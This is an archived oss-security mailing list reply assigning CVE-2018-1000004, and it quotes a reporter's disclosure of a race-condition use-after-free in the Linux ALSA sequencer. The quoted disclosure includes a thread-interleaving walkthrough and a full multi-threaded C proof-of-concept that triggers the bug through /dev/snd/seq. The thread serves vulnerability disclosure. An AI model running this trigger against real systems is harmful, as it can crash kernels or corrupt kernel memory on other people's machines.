X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["18124" "Tuesday" "16" "January" "2018" "09:38:32" "-0700" "Kurt Seifried" "kseifried@redhat.com" "<CANO=Ty39EoN_Hb5KHUGdy7gpCWdc0PCtCdkR7FjLTyobfP7qJg@mail.gmail.com>" "564" "Re: [oss-security] sound driver Conditional competition" nil nil nil "1" "2018011616:38:32" "[oss-security] sound driver Conditional competition" (number mark "U       kseifried@re Jan 16  564/18124 " thread-indent "\"Re: [oss-security] sound driver Conditional competition\"\n") "<20180116155104.GK32106@suse.de>" ("<2b14701d.790b.160fdd7fea8.Coremail.a4651386@163.com>" "<20180116155104.GK32106@suse.de>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 15657 invoked by uid 550); 16 Jan 2018 16:38:45 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 15619 invoked from network); 16 Jan 2018 16:38:44 -0000
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
         :message-id:subject:to:content-transfer-encoding;
        bh=i2CTCITqZwggF0VDb04nPgWHxN8W/3g36EGRkPEYqew=;
        b=PlnlMCwGpk9z1UDSN7TfRf16yG2+5YhJuzzR3s2SMIx+1UrAEHScRh5aM5wcEvKgHE
         wGPt4GV22QR38whvzz4Fvv+PPNnS8QnmIg+8GNamy9BMUbj1trPEy8t9Ywki2ouVZEOO
         jij2Zgu0Ppz7mGUTw9nRbT8UUo8YWEDsiYd6M6THWZ4GVAQS5YSY8y72g/Lrq4HpqKGc
         Fy/m+HW7nZS77UbZhVQ2O5b77XZPLRVDHwjnQjMH2jlm6l40filiOdYleknVkjd7IykJ
         aIhBGwYJptH/HoUYZydLw98vDA/8gs2+R8cbTz6Fz6jQAs56XTLYMVGzl6c8zuERUY2N
         edRg==
X-Gm-Message-State: AKwxytfP+9/JpTREyInbcIcA+Dub19TKCgAaIvrw5cg5sX8suRed4fwY
	2pjrRtEfaITuwzF4r1sFyAtSYe0PKfWYFdClEr1BG0JXu3Y=
X-Google-Smtp-Source: ACJfBovwouyx86iqk1AEIQ7M2tqX3SKd/KzKgbyDUzgCe/MYoudrj4RSWy3J0JUTaIiqkx1SpqqlEukoRTFY91on+lE=
X-Received: by 10.157.83.132 with SMTP id w4mr1049664otg.113.1516120712649;
 Tue, 16 Jan 2018 08:38:32 -0800 (PST)
MIME-Version: 1.0
In-Reply-To: <20180116155104.GK32106@suse.de>
References: <2b14701d.790b.160fdd7fea8.Coremail.a4651386@163.com> <20180116155104.GK32106@suse.de>
From: Kurt Seifried <kseifried@redhat.com>
Date: Tue, 16 Jan 2018 09:38:32 -0700
Message-ID: <CANO=Ty39EoN_Hb5KHUGdy7gpCWdc0PCtCdkR7FjLTyobfP7qJg@mail.gmail.com>
To: oss-security <oss-security@lists.openwall.com>
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
Subject: Re: [oss-security] sound driver Conditional competition

Apologies, I had asked the reporter for info and it wasn't what I
needed so it took some time to sort out, please use CVE-2018-1000004
for this issue.

On Tue, Jan 16, 2018 at 8:51 AM, Marcus Meissner <meissner@suse.de> wrote:
> Hi,
>
> Kurt, will you still allocate the CVE or should we ask Mitre.
>
> Ciao, Marcus
> On Tue, Jan 16, 2018 at 03:21:19PM +0800, luo wrote:
>> PRODUCT=EF=BC=9A linux kernel
>> VERSION=EF=BC=9A   Most versions.some deadlock ,some uaf.2.6=E3=80=82I t=
ested 2.6 versions, 3.10 versions, and 4.12
>> PROBLEMTYPE:  deadlock  or uaf
>> REFERENCES=EF=BC=9Ahttps://github.com/torvalds/linux/commit/b3defb791b26=
ea0683a93a4f49c77ec45ec96f10
>> DESCRIPTION=EF=BC=9A
>> This vulnerability, which belong to UAF caused by race conditions,
>> can impact the majority of linux distribution(audio system).
>>
>>
>> In file seq_clientmgr.c, function snd_seq_write and
>> snd_seq_ioctl_set_client_pool can cause conditional competition problems
>> when multi-thread is used.
>>
>> snd_seq_write calls snd_seq_cell_alloc to allocate memories for cell from
>> client->pool. When pool is exhausted, schedule is called to switch curre=
nt
>> thread to another thread, and add current thread to a queue for waiting.
>>
>> snd_seq_ioctl_set_client_pool calls snd_seq_pool_mark_closing to set
>> client->pool->closeing to 1, in order to prevent re-entrant. It also
>> calls snd_seq_queue_client_leave_cells to release cell. And it then calls
>> snd_seq_pool_done, first to release pool and allocate new pool and second
>> to set client->pool->closeing to 0. Function wake_up is both called in
>> snd_seq_queue_client_leave_cells and snd_seq_pool_done, to wake up the
>> thread in the waiting queue mentioned above, avoiding the use of any
>> wild pointer.
>>
>> All is seemed to be well designed , but there is a trick:
>>
>>
>> -- Thread A --
>> step 1:
>> A calls snd_seq_write to exhaust pool.
>>
>> step 2:
>> snd_seq_write calls func schedule to schedule threads, now go to Thread =
B.
>>
>>
>>
>> -- Thread B --
>> step 1:
>> B calls snd_seq_ioctl_set_client_pool.
>>
>> step 2:
>> snd_seq_ioctl_set_client_pool calls snd_seq_pool_mark_closing.
>> snd_seq_pool_mark_closing sets client->pool->closeing to 1.
>>
>> step 3:
>> Then snd_seq_ioctl_set_client_pool calls snd_seq_queue_client_leave_cell=
s.
>> snd_seq_queue_client_leave_cells release the memories of cells.
>> snd_seq_queue_client_leave_cells calls wake_up, now back to Thread A.
>>
>>
>>
>> -- Back To Thread A --
>> step 1:
>> A will find out that client->pool->closeing is 1, so snd_seq_cell_alloc =
fails.
>>
>> step 2:
>> Returning from snd_seq_cell_alloc to snd_seq_write. snd_seq_write also f=
ails.
>>
>> step 3:
>> A now call snd_seq_ioctl_set_client_pool.
>>
>> step 4:
>> snd_seq_ioctl_set_client_pool calls snd_seq_pool_mark_closing.
>> snd_seq_pool_mark_closing sets client->pool->closeing to 1 again.
>>
>> step 5:
>> Then snd_seq_ioctl_set_client_pool calls snd_seq_queue_client_leave_cell=
s.
>> cell is already release by B.
>> And because no thread is in waiting queue, so wake_up will not be called.
>>
>> step 6:
>> Then snd_seq_ioctl_set_client_pool calls snd_seq_pool_done.
>> snd_seq_pool_done release pool and allocate new pool.
>> snd_seq_pool_done sets client->pool->closeing to 0.
>> Now it's become reentrant.
>>
>> step 8:
>> So after a call to snd_seq_ioctl_set_client_pool, pool is new.
>> Thread A can call snd_seq_write many times to exhaust the memories of po=
ol.
>> Then A go to sleep, now switch to thread B.
>>
>>
>>
>> -- Back To Thread B --
>> step 1:
>> Back to snd_seq_queue_client_leave_cells, after previous call to wake_up.
>>
>> step 2:
>> Return to snd_seq_ioctl_set_client_pool.
>> snd_seq_ioctl_set_client_pool call snd_seq_pool_done.
>> snd_seq_pool_done release and allocate new pool.
>> now client->pool->closeing is already 0, and pool is new.
>>
>>
>> --------------------------------------------------------------------
>>
>> Now you see, the pool allocated by thread A is now released by thread B.
>> And thread B allocate new pool, which is the 3rd pool.
>>
>> But in thread A, in snd_seq_cell_alloc called by snd_seq_write, the pool=
 is
>> actually the 2cd pool, and meet a dead loop:
>>
>> while (pool->free =3D=3D NULL && ! nonblock && ! pool->closing)
>>
>> Note the 2cd pool is released by thread B in B's snd_seq_ioctl_set_clien=
t_pool.
>>
>> Further more, if serveral threads switch between sechedule and wake_up, =
there will be more obvious sequelae.
>>
>> ----------------------------------------------------
>>
>> call stack:
>>
>> thread a:
>> -> snd_seq_write
>>    -> snd_seq_client_enqueue_event
>>       -> snd_seq_event_dup
>>          -> snd_seq_cell_alloc
>>             -> schedule -> thread b
>>
>> thread b:
>> -> snd_seq_ioctl_set_client_pool
>>    -> snd_seq_pool_mark_closing    (set closeing to 1)
>>    -> snd_seq_queue_client_leave_cells  (release cell)
>>       -> wake_up -> thread a
>>
>> thread a:
>> -> snd_seq_ioctl_set_client_pool
>>    -> snd_seq_pool_mark_closing    (set closeing to 1 again)
>>    -> snd_seq_queue_client_leave_cells  (already release cell by thread =
b)
>>    -> snd_seq_pool_done    (release pool and allocate new pool, 2cd pool;
>>                           set closeing to 0)
>> -> snd_seq_write
>>    -> snd_seq_client_enqueue_event
>>       -> snd_seq_event_dup
>>          -> snd_seq_cell_alloc
>>             -> schedule -> thread b
>>
>> thread b:
>>    back to snd_seq_queue_client_leave_cells, after func wake_up
>>    -> snd_seq_queue_client_leave_cells
>>    -> snd_seq_pool_done    (release pool and allocate new pool, 3rd pool;
>>                           set closeing to 0)
>>       (leave 2cd pool's cell unhandled)
>>       -> wake_up -> thread a:
>>
>> thread a:
>> -> snd_seq_cell_alloc:
>>    while (pool->free =3D=3D NULL && ! nonblock && ! pool->closing)
>>    meet dead loop, now pool in thread a is the 2cd pool, has been releas=
ed,
>>    now is a wild pointer.
>>
>>
>> ---EOF---
>>
>> At 2018-01-12 09:24:58, "kseifried@redhat.com" <kseifried@redhat.com> wr=
ote:
>> >I'll need some details:
>> >
>> >[PRODUCT]:
>> >[VERSION]:
>> >[PROBLEMTYPE]:
>> >[REFERENCES]:
>> >[DESCRIPTION]:
>> >
>> >problemtype ideally the CWE identifier (http://cwe.mitre.org) and
>> >description includes product, version affected, description of problem,
>> >affected component, impact, etc. The references needs to be a public URL
>> >with details on the issue, if it's embargoed I'll need a URL where you
>> >plan to publish, thanks. No key found so sending plaintext.
>> >
>> >
>> >On 2018-01-11 06:19 PM, luo wrote:
>> >
>> >--
>> >
>> >Kurt Seifried -- Red Hat -- Product Security -- Cloud
>> >PGP A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
>> >Red Hat Product Security contact: secalert@redhat.com
>
>> #include <stdio.h>
>> #include <sys/types.h>
>> #include <sys/stat.h>
>> #include <fcntl.h>
>> #include <unistd.h>
>> #include <stdlib.h>
>>
>> #define SNDRV_SEQ_EVENT_LENGTH_MASK   (3<<2)
>> #define SNDRV_SEQ_QUEUE_DIRECT                253
>> #define SNDRV_SEQ_EVENT_LENGTH_VARIABLE       (1<<2)
>> #define SNDRV_SEQ_PORT_CAP_WRITE      (1<<1)
>> //int client;
>> typedef int  snd_seq_client_type_t;
>> typedef unsigned int snd_seq_tick_time_t;
>> typedef unsigned char snd_seq_event_type_t;
>> struct snd_seq_real_time {
>>       unsigned int tv_sec;    /* seconds */
>>       unsigned int tv_nsec;   /* nanoseconds */
>> };
>> struct snd_seq_ev_ext {
>>       unsigned int len;       /* length of data */
>>       void *ptr;              /* pointer to data (note: maybe 64-bit) */
>> };
>> struct snd_seq_addr {
>>       unsigned char client;   /**< Client number:         0..255, 255 =
=3D broadcast to all clients */
>>       unsigned char port;     /**< Port within client:    0..255, 255 =
=3D broadcast to all ports */
>> };
>> struct snd_seq_client_info {
>>       int client;                     /* client number to inquire */
>>       snd_seq_client_type_t type;     /* client type */
>>       char name[64];                  /* client name */
>>       unsigned int filter;            /* filter flags */
>>       unsigned char multicast_filter[8]; /* multicast filter bitmap */
>>       unsigned char event_filter[32]; /* event filter bitmap */
>>       int num_ports;                  /* RO: number of ports */
>>       int event_lost;                 /* number of lost events */
>>       int card;                       /* RO: card number[kernel] */
>>       int pid;                        /* RO: pid[user] */
>>       char reserved[56];              /* for future use */
>> };
>> union snd_seq_timestamp {
>>       snd_seq_tick_time_t tick;
>>       struct snd_seq_real_time time;
>> };
>> struct snd_seq_client_pool {
>>       int client;                     /* client number to inquire */
>>       int output_pool;                /* outgoing (write) pool size */
>>       int input_pool;                 /* incoming (read) pool size */
>>       int output_room;                /* minimum free pool size for sele=
ct/blocking mode */
>>       int output_free;                /* unused size */
>>       int input_free;                 /* unused size */
>>       char reserved[64];
>> };
>> struct snd_seq_port_info {
>>       struct snd_seq_addr addr;       /* client/port numbers */
>>       char name[64];                  /* port name */
>>
>>       unsigned int capability;        /* port capability bits */
>>       unsigned int type;              /* port type bits */
>>       int midi_channels;              /* channels per MIDI port */
>>       int midi_voices;                /* voices per MIDI port */
>>       int synth_voices;               /* voices per SYNTH port */
>>
>>       int read_use;                   /* R/O: subscribers for output (fr=
om this port) */
>>       int write_use;                  /* R/O: subscribers for input (to =
this port) */
>>
>>       void *kernel;                   /* reserved for kernel use (must b=
e NULL) */
>>       unsigned int flags;             /* misc. conditioning */
>>       unsigned char time_queue;       /* queue # for timestamping */
>>       char reserved[59];              /* for future use */
>> };
>> struct snd_seq_queue_info {
>>       int queue;              /* queue id */
>>
>>       /*
>>        *  security settings, only owner of this queue can start/stop tim=
er
>>        *  etc. if the queue is locked for other clients
>>        */
>>       int owner;              /* client id for owner of the queue */
>>       unsigned locked:1;      /* timing queue locked for other queues */
>>       char name[64];          /* name of this queue */
>>       unsigned int flags;     /* flags */
>>       char reserved[60];      /* for future use */
>>
>> };
>> struct snd_seq_event {
>>       snd_seq_event_type_t type;      /* event type */
>>       unsigned char flags;            /* event flags */
>>       char tag;
>>
>>       unsigned char queue;            /* schedule queue */
>>       union snd_seq_timestamp time;   /* schedule time */
>>
>>
>>       struct snd_seq_addr source;     /* source address */
>>       struct snd_seq_addr dest;       /* destination address */
>>
>>       union {                         /* event data... */
>>               struct snd_seq_ev_ext ext;
>>       } data;
>> };
>> //gcc competition.c -o competition -lpthread
>> //./competition
>> void *thread1(void *arg)
>> {
>>       struct snd_seq_event event;//??????????????????????????? snd_seq_f=
ifo_event_in
>>       char* buf;
>>       int num;
>>       int i;
>>       int ret=3D0;
>>       int fd=3D*(int*)arg;
>>       struct snd_seq_client_pool pool_info;
>>       buf=3D(char*)malloc(60000);
>>       event.flags=3DSNDRV_SEQ_EVENT_LENGTH_VARIABLE;//snd_seq_ev_is_vari=
able
>>       event.data.ext.len=3D0xc0000770;
>>       event.data.ext.ptr=3D0xffffffff;
>>
>>       ///////???????????????
>>       event.type=3D130;
>>       event.queue=3D0;
>>       event.dest.client=3D128;//get_event_dest_client ???2??????????????=
???? ??????????????? accept_input    //??????????????????
>>       //printf("client %d\n",client);
>>       event.dest.port=3D0;//snd_seq_port_use_ptr port->capability???????=
??   ?????????
>>       num=3D2000/sizeof(event);
>>       for(i=3D0;i<num;i++)
>>       {
>>               memcpy(buf+i*sizeof(event),(char*)&event,sizeof(event));
>>       }
>>       ret=3Dwrite(fd,buf,2000);
>>       i=3D500;
>>       while(1)
>>       {
>>
>>       ret=3Dwrite(fd,buf,2000);
>>       if(ret>0)
>>       {
>>               printf("write 2000 ok num=3D%d\n",ret);
>>       }
>>       else
>>       {
>>               i++;
>>       printf("write fail");
>>       pool_info.input_pool=3D100;
>>       pool_info.output_pool=3Di;
>>       pool_info.client=3D128;//??????????????????
>>       //printf("client %d\n",client);
>>       ret=3Dioctl(fd,1079530316,&pool_info);
>>     if(!(ret<0))
>>               printf("thread1 ok  snd_seq_ioctl_set_client_pool");
>>       }
>>       }
>>
>>
>> }
>> void *thread2(void *arg)
>> {
>>       struct snd_seq_event event;
>>       struct snd_seq_client_pool pool_info;
>>       int fd=3D*(int*)arg;
>>       int ret=3D0;
>>       int i=3D600;
>>       int num;
>>       char* buf;
>>       sleep(3);
>>       pool_info.input_pool=3D100;
>>       pool_info.output_pool=3D600;
>>       pool_info.client=3D128;//??????????????????
>>       //printf("client %d\n",client);
>>       printf("thread2 start");
>>       event.flags=3DSNDRV_SEQ_EVENT_LENGTH_VARIABLE;
>>       buf=3D(char*)malloc(60000);
>>               event.data.ext.len=3D0xc0000770;
>>       event.data.ext.ptr=3D0xffffffff;
>>       num=3D2000/sizeof(event);
>>       ///////???????????????
>>       event.type=3D130;
>>       event.queue=3D0;
>>       event.dest.client=3D128;//get_event_dest_client ???2??????????????=
???? ??????????????? accept_input    //??????????????????
>>       //printf("client %d\n",client);
>>       event.dest.port=3D0;//snd_seq_port_use_ptr port->capability???????=
??   ?????????
>>               for(i=3D0;i<num;i++)
>>       {
>>               memcpy(buf+i*sizeof(event),(char*)&event,sizeof(event));
>>       }
>>       while(1)
>>       {
>>     sleep(3);
>>       pool_info.output_pool=3Di;
>>       i++;
>>       if(i%2)
>>       {
>>
>>               pool_info.output_pool=3D600;
>>       }
>>       //close(fd);
>>       ret=3Dioctl(fd,1079530316,&pool_info);//snd_seq_ioctl_set_client_p=
ool
>>       if(ret<0)//?????????????????????pool
>>       {
>>               printf("snd_seq_ioctl_set_client_pool fail\n");
>>       }
>>       else
>>       {
>>               ret=3Dwrite(fd,buf,2000);
>>               if(!(ret<0))
>>               printf("thread2 ok  write");
>>               ret=3Dwrite(fd,buf,2000);
>>               ret=3Dwrite(fd,buf,2000);
>>               ret=3Dwrite(fd,buf,2000);
>>               ret=3Dwrite(fd,buf,2000);
>>           ret=3Dwrite(fd,buf,2000);
>>               ret=3Dwrite(fd,buf,2000);
>>               ret=3Dwrite(fd,buf,2000);
>>               ret=3Dwrite(fd,buf,2000);
>>               ret=3Dwrite(fd,buf,2000);
>>               ret=3Dwrite(fd,buf,2000);
>>               printf("snd_seq_ioctl_set_client_pool ok \n");
>>
>>       }
>>
>>
>>       }
>>
>>
>>
>>
>> }
>>
>>
>> int main()
>> {
>>
>>       int fd;
>>       struct snd_seq_client_info clent_info;
>>       struct snd_seq_port_info port_info;
>>       struct snd_seq_queue_info queue_info;
>>       int ret=3D0;
>>       pthread_t th;
>>
>>       fd =3Dopen("/dev/snd/seq", O_RDWR);
>>       if(fd=3D=3D0)
>>       {
>>               printf("fail open%d\n",fd);
>>               return 0;
>>       }
>>       ioctl(fd,3233567504,&clent_info);//snd_seq_ioctl_get_client_info
>>       port_info.addr.client=3D128;//??????????????????
>>       //client=3Dclent_info.client;
>>       //printf("main client %d\n",clent_info.client);
>>       port_info.addr.port =3D8;
>>       port_info.capability=3DSNDRV_SEQ_PORT_CAP_WRITE;
>>       ioctl(fd,3231994656,&port_info);//snd_seq_ioctl_create_port ??????
>>       memset(&queue_info,0x00,sizeof(queue_info));
>>       ioctl(fd,3230421810,&queue_info);//snd_seq_ioctl_create_queue ????=
?????????????? queue_info->queue
>>
>>     ret=3Dpthread_create( &th, NULL, thread1, (void*)&fd);
>>       if(ret!=3D0)
>>       {
>>               printf("create thread11111111111111111 error!\n");
>>           return -1;
>>       }
>>       else
>>       {
>>               ret=3Dpthread_create( &th, NULL, thread1, (void*)&fd);
>>               ret=3Dpthread_create( &th, NULL, thread1, (void*)&fd);
>>               ret=3Dpthread_create( &th, NULL, thread1, (void*)&fd);
>>               ret=3Dpthread_create( &th, NULL, thread1, (void*)&fd);
>>               ret=3Dpthread_create( &th, NULL, thread1, (void*)&fd);
>>               ret=3Dpthread_create( &th, NULL, thread1, (void*)&fd);
>>               ret=3Dpthread_create( &th, NULL, thread1, (void*)&fd);
>>               ret=3Dpthread_create( &th, NULL, thread1, (void*)&fd);
>>               ret=3Dpthread_create( &th, NULL, thread1, (void*)&fd);
>>               ret=3Dpthread_create( &th, NULL, thread1, (void*)&fd);
>>               printf("create thread1 okokokokokokokokoko!\n");
>>       }
>>       ret=3Dpthread_create( &th, NULL, thread2, (void*)&fd);
>>       if(ret!=3D0)
>>       {
>>               printf("create thread2222222222 error!\n");
>>               return -1;
>>       }
>>       else
>>       {
>>               printf("create thread2 okokokokokokokokoko!\n");
>>       }
>>       //ret=3Dpthread_create( &th, NULL, thread1, (void*)&fd);
>>       sleep(1800);
>>
>>
>>       return 0;
>> }
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>>
>
>
> --
> Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg; Zi.=
 3.1-33,+49-911-740 53-432,,serv=3Dloki,mail=3Dwotan,type=3Dreal <meissner@=
suse.de>



--=20

Kurt Seifried -- Red Hat -- Product Security -- Cloud
PGP A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
Red Hat Product Security contact: secalert@redhat.com
